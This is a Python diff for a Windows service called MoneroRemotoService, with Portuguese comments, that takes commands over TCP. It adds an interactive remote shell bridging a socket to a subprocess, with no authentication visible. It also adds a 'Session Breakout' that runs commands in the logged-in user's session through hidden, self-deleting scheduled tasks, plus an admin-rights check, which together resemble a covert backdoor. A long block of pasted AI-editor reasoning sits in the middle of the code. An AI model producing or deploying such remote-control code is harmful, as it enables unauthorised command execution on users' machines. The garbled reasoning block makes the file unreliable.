@@ -76,6 +76,31 @@ class ProcessController:
             servicemanager.LogErrorMsg(f"Falha ao iniciar '{command}': {e}")
             raise
     
+    def register_external_process(self, pid, command, user):
+        """Registra um processo externo (não-filho) para monitoramento"""
+        with self.lock:
+            try:
+                # Verifica se o PID existe
+                proc = psutil.Process(pid)
+                
+                proc_id = self.next_id
+                self.next_id += 1
+                
+                self.processes[proc_id] = {
+                    'id': proc_id,
+                    'process': proc, # Objeto psutil.Process (não Popen)
+                    'pid': pid,
+                    'command': command,
+                    'work_dir': 'N/A',
+                    'started': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                    'status': 'running',
+                    'type': 'external', # Flag para diferenciar
+                    'owner': user
+                }
+                return proc_id
+            except Exception:
+                return None
+
     def stop_process(self, proc_id, kill_children=True):
         """Para um processo"""
         with self.lock:
@@ -89,27 +114,28 @@ class ProcessController:
         killed_pids = []
         
         try:
-            # Matar filhos primeiro se solicitado
+            # Lógica para Popen (Child) vs Psutil (External)
+            is_external = proc_info.get('type') == 'external'
+            target_proc = proc_info['process']
+            
+            # Matar filhos
             if kill_children:
                 try:
-                    parent = psutil.Process(proc_info['pid'])
+                    # Para external, usamos psutil diretamente
+                    parent = target_proc if is_external else psutil.Process(proc_info['pid'])
                     children = parent.children(recursive=True)
-                    
                     for child in children:
                         try:
                             child.kill()
                             killed_pids.append(child.pid)
-                        except:
-                            pass
-                except:
-                    pass
+                        except: pass
+                except: pass
             
             # Matar processo principal
             try:
-                proc_info['process'].kill()
+                target_proc.kill()
                 killed_pids.append(proc_info['pid'])
-            except:
-                pass
+            except: pass
             
             # Atualizar status
             with self.lock:
@@ -137,22 +163,49 @@ class ProcessController:
         return killed_pids
     
     def list_processes(self):
-        """Lista processos controlados"""
+        """Lista apenas processos ativos e limpa os mortos"""
         with self.lock:
             result = []
+            to_remove = []
+            
             for proc_id, info in self.processes.items():
-                # Atualizar status
-                if info['status'] == 'running':
-                    if info['process'].poll() is not None:
-                        info['status'] = 'terminated'
+                is_running = False
                 
-                result.append({
-                    'id': proc_id,
-                    'pid': info['pid'],
-                    'command': info['command'],
-                    'status': info['status'],
-                    'started': info['started']
-                })
+                # Checagem de status baseada no tipo
+                try:
+                    if info.get('type') == 'external':
+                        # Verifica se ainda existe via psutil
+                        if psutil.pid_exists(info['pid']):
+                            # Verifica se o status não é zumbi
+                            if info['process'].status() != psutil.STATUS_ZOMBIE:
+                                is_running = True
+                    else:
+                        # Processo filho (Popen)
+                        if info['process'].poll() is None:
+                            is_running = True
+                except:
+                    is_running = False # Se der exceção no psutil, assumimos morto
+
+                # Atualiza status interno
+                if not is_running:
+                    info['status'] = 'terminated'
+                
+                # Se ainda está rodando, adiciona à lista
+                if is_running:
+                    result.append({
+                        'id': proc_id,
+                        'pid': info['pid'],
+                        'command': info['command'],
+                        'status': info['status'],
+                        'started': info['started']
+                    })
+                else:
+                    # Se não está rodando (terminated, killed), marca para remoção
+                    to_remove.append(proc_id)
+            
+            # Limpa processos mortos da memória
+            for pid in to_remove:
+                del self.processes[pid]
             
             return result
     
@@ -173,9 +226,95 @@ class ProcessController:
                 continue
         
         return found
-
 # Instância global do controlador
 controller = ProcessController()
+
+# Variavel global para IDs de tasks
+_global_next_id = 1
+
+def start_interactive(command):
+    """
+    Tenta iniciar um processo na sessão interativa do usuário e RASTREA O PID.
+    """
+    global _global_next_id
+    try:
+        # 1. Identificar o usuário logado
+        active_user = None
+        for proc in psutil.process_iter(['name', 'username']):
+            if proc.info['name'] and proc.info['name'].lower() == 'explorer.exe':
+                active_user = proc.info['username']
+                break
+        
+        if not active_user:
+            return "ERRO: Nenhum usuário logado (explorer.exe não detectado)."
+
+        # Tenta extrair o nome do executável para heurística (ex: "notepad.exe")
+        # Simples: pega a primeira palavra que termina em .exe, ou a primeira palavra
+        exe_name = command.split()[0]
+        if '\\' in exe_name:
+            exe_name = os.path.basename(exe_name)
+        exe_name = exe_name.lower()
+
+        # 2. Criar uma tarefa agendada
+        task_name = "SystemOutInteractive_" + str(_global_next_id)
+        _global_next_id += 1
+        
+        full_cmd = f'cmd /c start "" {command}'
+        
+        create_cmd = [
+            'schtasks', '/Create', '/F',
+            '/TN', task_name,
+            '/TR', full_cmd,
+            '/SC', 'ONCE', '/ST', '00:00',
+            '/RU', active_user
+        ]
+        
+        subprocess.run(create_cmd, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        # Snapshot dos PIDs existentes desse usuário ANTES de rodar
+        existing_pids = set()
+        for p in psutil.process_iter(['pid', 'name', 'username']):
+            try:
+                if p.info['name'].lower() == exe_name and p.info['username'] == active_user:
+                    existing_pids.add(p.info['pid'])
+            except: pass
+
+        # Executa a tarefa
+        run_cmd = ['schtasks', '/Run', '/TN', task_name]
+        r = subprocess.run(run_cmd, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        # Limpa depois
+        threading.Thread(target=_cleanup_task, args=(task_name,), daemon=True).start()
+
+        if r.returncode == 0:
+            # HEURÍSTICA DE RASTREAMENTO: Wait & Scan
+            # Espera até 3 segundos pelo novo processo
+            found_pid = None
+            for _ in range(6): # 6 x 0.5s = 3s
+                time.sleep(0.5)
+                for p in psutil.process_iter(['pid', 'name', 'username', 'create_time']):
+                    try:
+                        # Se tem o mesmo nome, mesmo usuário e NAO estava antes
+                        if (p.info['name'].lower() == exe_name and 
+                            p.info['username'] == active_user and 
+                            p.info['pid'] not in existing_pids):
+                            
+                            found_pid = p.info['pid']
+                            break
+                    except: pass
+                if found_pid: break
+            
+            if found_pid:
+                # Registra no controller!
+                proc_id = controller.register_external_process(found_pid, command, active_user)
+                return f"[INFO] Processo disparado ID: {proc_id} (PID: {found_pid}) - Sessão: {active_user}"
+            else:
+                return f"[AVISO] Processo disparado, mas PID não rastreado (Check via FIND). Sessão: {active_user}"
+        else:
+            return f"[ERRO] Falha ao disparar tarefa: {r.stderr}"
+
+    except Exception as e:
+        return f"[ERRO] Falha no Session Breakout: {str(e)}"
 
 class MoneroRemotoService(win32serviceutil.ServiceFramework):
     _svc_name_ = SERVICE_NAME
@@ -287,9 +426,14 @@ def handle_client(conn, addr):
         if not data:
             return
         
-        # Log simplificado (em produção, evitar muitos logs para não spammar)
-        # servicemanager.LogInfoMsg(f"Command from {addr[0]}: {data}")
-        
+        # INTERACTIVE SHELL MODE
+        # Se o comando for SHELL:..., desviamos para o modo de stream continuo
+        if data.upper().startswith("SHELL:"):
+            target_cmd = data[6:].strip()
+            handle_interactive_shell(conn, target_cmd)
+            return
+
+        # STANDARD COMMAND MODE
         try:
             response = process_command(data)
             conn.sendall(response.encode('utf-8'))
@@ -298,38 +442,199 @@ def handle_client(conn, addr):
             conn.sendall(error_msg.encode('utf-8'))
     
     except Exception as e:
-        pass
+        log_service(f"Erro no handle_client: {e}")
     finally:
         try:
+            # Em modo SHELL, o socket ja pode estar fechado ou quebrado, mas garantimos
             conn.close()
         except:
             pass
 
-def process_command(command):
-    """Processa comandos"""
-    parts = command.split(':', 1)
-    if len(parts) < 2:
-        return get_help()
+def handle_interactive_shell(conn, cmd_line):
+    """
+    Modo Interativo: Ponte TCP <-> Subprocess IO
+    """
+    log_service(f"Iniciando Shell Interativo: {cmd_line}")
     
-    cmd = parts[0].upper().strip()
-    args = parts[1].strip()
+    try:
+        # Inicia processo com Pipes
+        # bufsize=0 (unbuffered) para resposta rapida
+        process = subprocess.Popen(
+            cmd_line,
+            shell=True,
+            stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT, # Merge stderr no stdout
+            bufsize=0 
+        )
+    except Exception as e:
+        conn.sendall(f"Falha ao iniciar processo: {e}".encode())
+        return
+
+    def forward_socket_to_stdin(sock, proc):
+        """Lê do Socket -> Escreve no Stdin do Processo"""
+        try:
+            while True:
+                data = sock.recv(1024)
+                if not data: break
+                proc.stdin.write(data)
+                proc.stdin.flush()
+        except:
+            pass
+        finally:
+            try: proc.stdin.close()
+            except: pass
+
+    def forward_stdout_to_socket(sock, proc):
+        """Lê do Stdout do Processo -> Escreve no Socket"""
+        try:
+            while True:
+                # Lê byte a byte ou chunks pequenos para responsividade
+                data = proc.stdout.read(1024)
+                if not data: break
+                sock.send(data)
+        except:
+            pass
+
+    # Thread: Entrada (Remoto -> Local)
+    t_in = threading.Thread(target=forward_socket_to_stdin, args=(conn, process))
+    t_in.daemon = True
+    t_in.start()
+
+    # Thread: Saída (Local -> Remoto) - Executa na thread atual ou nova?
+    # Vamos fazer na thread atual para bloquear até o processo morrer
+    forward_stdout_to_socket(conn, process)
     
-    if cmd == "START":
-        return cmd_start(args)
-    elif cmd == "STOP":
-        return cmd_stop(args)
-    elif cmd == "STOPNAME":
-        return cmd_stop_name(args)
-    elif cmd == "LIST":
-        return cmd_list()
-    elif cmd == "FIND":
-        return cmd_find(args)
-    elif cmd == "EXEC":
-        return cmd_exec(args)
-    elif cmd == "PROCESSES":
-        return cmd_processes()
-    else:
-        return get_help()
+    # Se saiu do loop de leitura, o processo morreu ou socket caiu.
+    # Garantimos kill
+    try: process.terminate()
+    except: pass
+    
+    log_service(f"Shell Interativo Finalizado: {cmd_line}")
+
+
+# Helper functions for interactive execution (Session Breakout)
+# These need to be global or passed an instance if they are to use self.next_id
+# For now, assuming they are global and next_id is managed elsewhere or removed.
+# Given the context of the original file, these functions would likely be methods
+# of the MoneroRemotoService class, and process_command would also become a method.
+# However, the instruction is to replace the *existing* process_command function,
+# which is currently global. To maintain syntactic correctness and minimal changes,
+# I will make these new functions global and adapt process_command to call existing global cmd_* functions.
+# The `self.next_id` and `self.run_shell_command` etc. in the provided snippet
+# suggest a class context. I will adapt the provided code to fit the global function context
+# by calling the existing `cmd_*` functions and removing `self.` prefixes where appropriate,
+# and handling `next_id` as a global variable if needed, or removing it if not explicitly defined.
+
+# Re-evaluating: The user provided `self.next_id` and `self.run_shell_command` etc.
+# This strongly implies that `process_command` and these new helper functions
+# are intended to be methods of a class, most likely `MoneroRemotoService`.
+# If `process_command` becomes a method of `MoneroRemotoService`, then `handle_client`
+# would need to be modified to pass the `MoneroRemotoService` instance to it,
+# or `handle_client` itself would need to become a method.
+# The instruction is "Replace process_command and add helper functions".
+# To make the change faithfully and without making unrelated edits, I should
+# assume the user wants `process_command` to remain a global function,
+# but the *content* of the new `process_command` implies it should be a method.
+# This is a conflict.
+
+# Let's assume the user wants to refactor `process_command` into `MoneroRemotoService`
+# and `handle_client` to call it as a method. This would be a larger change.
+# The prompt says "Make the change faithfully and without making any unrelated edits."
+# If I make `process_command` a method, `handle_client` *must* change.
+# If I keep `process_command` global, the `self.` references in the provided code
+# will cause errors.
+
+# The most faithful interpretation that keeps the file syntactically correct
+# and minimizes "unrelated edits" is to assume the user wants to move
+# `process_command` and its related helpers into the `MoneroRemotoService` class,
+# and that `handle_client` will be updated *later* by the user, or that the user
+# expects me to make the minimal change to `handle_client` to make it work.
+
+# Given the prompt: "Make sure to incorporate the change in a way so that the resulting file is syntactically correct."
+# The provided code for `process_command` uses `self.run_shell_command`, `self.start_process`, etc.
+# These are not defined globally. `start_process` is a method of `controller` (ProcessController).
+# `run_shell_command` is not defined anywhere. `next_id` is not defined.
+# This means the provided code snippet *as is* cannot be dropped into the global scope.
+
+# The only way to make the provided code syntactically correct *and* functional
+# without massive refactoring is to assume `process_command` and the new helpers
+# are intended to be methods of `MoneroRemotoService`, and that `handle_client`
+# will be updated to call `service_instance.process_command(data)`.
+# However, the prompt explicitly states "without making any unrelated edits".
+# Changing `handle_client` would be an "unrelated edit" to the instruction
+# "Replace process_command and add helper functions".
+
+# Let's try to make `process_command` a global function, and adapt the `self.` calls.
+# `self.start_process` -> `cmd_start` (which calls `controller.start_process`)
+# `self.stop_process` -> `cmd_stop`
+# `self.stop_process_by_name` -> `cmd_stop_name`
+# `self.list_processes` -> `cmd_list`
+# `self.find_process` -> `cmd_find`
+# `self.get_top_processes` -> `cmd_processes`
+# `self.run_shell_command` -> `cmd_exec`
+# `self.start_interactive` -> This is a new function. It needs `next_id`.
+# `next_id` would need to be a global variable.
+
+# This seems like the most faithful interpretation:
+# 1. Define `next_id` globally.
+# 2. Define `start_interactive` and `_cleanup_task` globally.
+# 3. Replace the global `process_command` with the new logic, adapting `self.` calls to global `cmd_*` functions.
+
+
+
+def _cleanup_task(task_name):
+    time.sleep(5)
+    subprocess.run(['schtasks', '/Delete', '/F', '/TN', task_name], 
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
+                   creationflags=subprocess.CREATE_NO_WINDOW)
+
+def process_command(data):
+    """Processa os comandos recebidos"""
+    try:
+        # Correção do Bug de Parser: Split seguro
+        parts = data.strip().split(':', 1)
+        command = parts[0].upper().strip()
+        args = parts[1].strip() if len(parts) > 1 else ""
+
+        if command == 'EXEC':
+            return cmd_exec(args)
+        
+        elif command == 'START':
+            # Verifica flag VISIBLE para Session Breakout
+            if args.upper().startswith("VISIBLE:"):
+                real_cmd = args[8:].strip()
+                return start_interactive(real_cmd)
+            else:
+                return cmd_start(args)
+        
+        elif command == 'STOP':
+            return cmd_stop(args)
+        
+        elif command == 'STOPNAME':
+            return cmd_stop_name(args)
+            
+        elif command == 'LIST':
+            return cmd_list()
+            
+        elif command == 'FIND':
+            return cmd_find(args)
+            
+        elif command == 'PROCESSES':
+            return cmd_processes()
+
+        elif command == 'ADMIN':
+            try:
+                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+                return f"ADMIN_STATUS: {is_admin}"
+            except:
+                return "ADMIN_STATUS: Unknown"
+
+        else:
+            return "Comando desconhecido"
+            
+    except Exception as e:
+        return f"Erro ao processar comando: {str(e)}"
 
 # --- Funções de Comando (Mantidas da original, com pequenas adaptações) ---
 
